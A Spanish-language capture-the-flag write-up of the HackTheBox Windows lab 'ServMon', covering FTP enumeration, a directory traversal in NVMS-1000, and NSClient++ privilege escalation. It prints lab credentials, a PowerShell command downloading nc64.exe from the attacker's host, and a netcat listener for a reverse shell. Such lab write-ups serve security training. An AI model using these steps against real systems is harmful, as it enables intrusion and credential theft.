---
layout      : post
title       : "ServMon - HackTheBox"
author      : elc4br4
image       : assets/images/HTB/Servmon-HackTheBox/ServMon.webp
category    : [ htb ]
tags        : [ Windows ]
---

En esta ocasión tenemos una máquina Windows de nivel Easy.
Tocaremos un poco de FTP (que nos dará pistas), explotaremos una vulnerabilidad en el servidor web (directory transversal) y escalaremos privilegios abusando de una vulnerabiliad del servidor NSClient++

![](/assets/images/HTB/Servmon-HackTheBox/rating-servmon.png)

[![HTBadge](https://www.hackthebox.eu/badge/image/533771)](https://www.hackthebox.com/home/users/profile/533771)

...


**Un pequeño INDICE**

1. [Reconocimiento](#reconocimiento).
    * [Reconocimiento de Puertos](#recon-nmap).
2. [FTP](#ftp).
3. [SMB](#smb).
4. [Enumeración](#enumeración).
    * [Puerto 80](#enum-web80).
    * [Puerto 8443](##enum-web8443).
5. [Escalada de Privilegios](#privesc). 
    * [NSClient++](#nclient).      


...

# Reconocimiento [#](reconocimiento) {#reconocimiento}

----

## Reconocimiento de Puertos [📌](#recon-nmap) {#recon-nmap}

```nmap
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5666/tcp  open  nrpe
6063/tcp  open  x11
6699/tcp  open  napster
8443/tcp  open  https-alt
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
```

Tenemos un listado de puertos muy amplio, a través de la herramienta extractPorts de s4vitar los copio en la clipboard y realizo un escaneo más detallado de servicios y versiones.

```nmap
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  07:35PM       <DIR>          Users
22/tcp    open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
80/tcp    open  http
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5666/tcp  open  tcpwrapped
6063/tcp  open  x11?
6699/tcp  open  napster?
8443/tcp  open  ssl/https-alt
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     iday
|     :Saturday
|     workers
|_    jobs
| http-title: NSClient++
|_Requested resource was /index.html
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.92%I=7%D=9/16%Time=6324D30D%P=x86_64-pc-linux-gnu%r(NULL
SF:,6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht
SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
SF:\r\n")%r(GetRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex
SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x
SF:20\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20X
SF:HTML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/D
SF:TD/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.
SF:org/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\
SF:x20\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x2
SF:0\x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")
SF:%r(HTTPOptions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
SF:l\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\
SF:n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\
SF:x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xh
SF:tml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1
SF:999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x
SF:20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20
SF:\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(RT
SF:SPRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\n
SF:Content-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n
SF:\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\
SF:.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-
SF:transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/x
SF:html\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x2
SF:0<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\
SF:x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.92%T=SSL%I=7%D=9/16%Time=6324D316%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation
SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0iday\0\0\0\0:Saturday\0\x0
SF:2\x12\x02\x18\0\x1aE\n\x07workers\x12\x0b\n\x04jobs\x12\x03\x18\xde\x02
SF:\x12")%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\
SF:r\nDocument\x20not\x20found")%r(FourOhFourRequest,36,"HTTP/1\.1\x20404\
SF:r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(RTSPReques
SF:t,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\
SF:x20found")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r
SF:\n\r\nDocument\x20not\x20found");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-09-16T19:50:39
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: -2s
```

Como de costumbre extraeré la información más importante del escaneo.

| Puertos | Servicios | Versiones |
| ------- | --------- | --------- |
| 21      | FTP       | Microsoft ftpd |
| 22      | SSH       | OpenSSH for_Windows_8.0 |
| 80      | HTPP      | Servidor Web Desconocido |
| 445     | SMB       | microsoft-ds | 
| 8443    | ssl/https-alt | NSClient++ |

> Servidor FTP --> Acceso anónimo

Iremos por partes, comenzando por enumerar el servidor FTP.

# FTP [#](ftp) {#ftp}

Una vez nos conectamos usando las credenciales anonymous:anonymous encontramos dos usuarios

> Nadine_
> Nathan

Dentro de la carpeta del usuario Nadine encontramos el archivo Confidential.txt
Y dentro de la carpeta del usuario Nathan encontramos el archivo "Notes to do.txt"

El archivo Confidential tiene el siguiente contenido:

```Confidential
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.
Regards

Nadine
```

Las credenciales se encuentran en la carpeta Desktop del usuario Nathan, posteriormente intentaremos conseguirlas.

Y en el archivo "Notes to do.txt":

```Notes
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

Es una lista de cosas que se deben hacer.

# SMB [#](smb) {#smb}

Continuo enumerando el servidor SMB ya que hemos terminado de enumerar el FTP.

![](/assets/images/HTB/Servmon-HackTheBox/crackmapexecsmb.png)

1. El nombre de la máquina es SERVMON

2. El nombre de dominio es ServMon 

3. El SMB no está firmado

![](/assets/images/HTB/Servmon-HackTheBox/smb.png)

Como vemos en el SMB no hay nada tampoco...

Asique ahora procedo a enumerar los servidores web, comenzando por el puerto 80.


# Enumeración [#](enumeración) {#enumeración}

----

## Puerto 80 [📌](#enum-web80) {#enum-web80}

Como vemos tenemos un servidor web con el nombre NVMS-1000 con un panel de login.

![](/assets/images/HTB/Servmon-HackTheBox/web1.png)

Lo primero que hago es buscar vulnerabilidades.

![](/assets/images/HTB/Servmon-HackTheBox/searchsploit.png)

Tenemos un Directory Transversal, vamos a ver como podemos explotarlo :

![](/assets/images/HTB/Servmon-HackTheBox/exploit1.png)

Abrimos burpsuite, capturamos la petición de la web y añadimos lo siguiente:

![](/assets/images/HTB/Servmon-HackTheBox/burpsuite.png)

Aprovechando que existe un directory Transversal voy a intentar leer las credenciales de las que se nos hablaba en la nota.

![](/assets/images/HTB/Servmon-HackTheBox/contrase%C3%B1as.png)

Tenemos unas credenciales que podríamos usar para conectarnos la máquina, pero antes de nada enumeraré el otro servidor para no dejarme nada sin ver.
 
## Puerto 8443 [📌](#enum-web8443) {#enum-web8443}

Intento acceder para ver el contenido del servidor pero no funciona... 

De igual forma sabemos el nombre del servicio que ejecuta asique buscaré vulnerabiliades

![](/assets/images/HTB/Servmon-HackTheBox/searchsploit2.png)

Tenemos una escalada de privilegios y un RCE pero necesitamos credenciales

![](/assets/images/HTB/Servmon-HackTheBox/F.gif)

NO tenemos nada importante, asique usaré las credenciales para conectarme a la máquina y probaré a usarlas en el protocolo smb, pero claro, tenemos varias contraseñas y dos posibles usuarios...

Creo una lista con las contraseñas y otra con los dos usuarios.

![](/assets/images/HTB/Servmon-HackTheBox/crackmapexec2.png)


```crackmapexec
SMB         10.10.10.184    445    SERVMON          [+] ServMon\nadine:L1k3B1gBut7s@W0rk
```

Uso las credenciales para conectarme por ssh y obtengo la flag user.txt

# Escalada de Privilegios [#](privesc) {#privesc}

----

## NSClient++[👽](nsclient) {#nsclient}

Para escalar recordemos que tenemos una vulnerabilidad en el servidor NSClient++

Pero antes enumero el servidor web a través de la sesión ssh que tenemos activa busacando la carpeta de instalación del servidor.

Seguimos los pasos de la escalada.

> Obtener la contraseña de acceso del servidor.  

```ssh
nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display
Current password: ew2x6SsGTxjRwXOT
```

> Sólo se puede acceder a través de localhost, de forma que debemos crear un túnel ssh para poder conectarnos.

```bash
ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184
```

Accedo, inicio sesión y sigo los pasos para escalar privilegios.

Los módulos ya estaban activados.

> Subir el archivo nc.exe a la ruta programdata de la máquina víctima

```win
powershell wget http://10.10.14.13:8000/nc64.exe -outfile nc64.exe
```

> Una vez subido abrimos un oyente de netcat en el puerto configurado 

```bash
nc -lnvp 443
```

> Y desde el navegador nos dirigimos a _modules_

![](/assets/images/HTB/Servmon-HackTheBox/privesc1.png)

![](/assets/images/HTB/Servmon-HackTheBox/privesc2.png)

Y añadimos el comando para obtener conexión a través del netcat.

> Recargamos el módulo y somos root.

![](/assets/images/HTB/Servmon-HackTheBox/privesc3.png)


![](/assets/images/HTB/Servmon-HackTheBox/root.png)



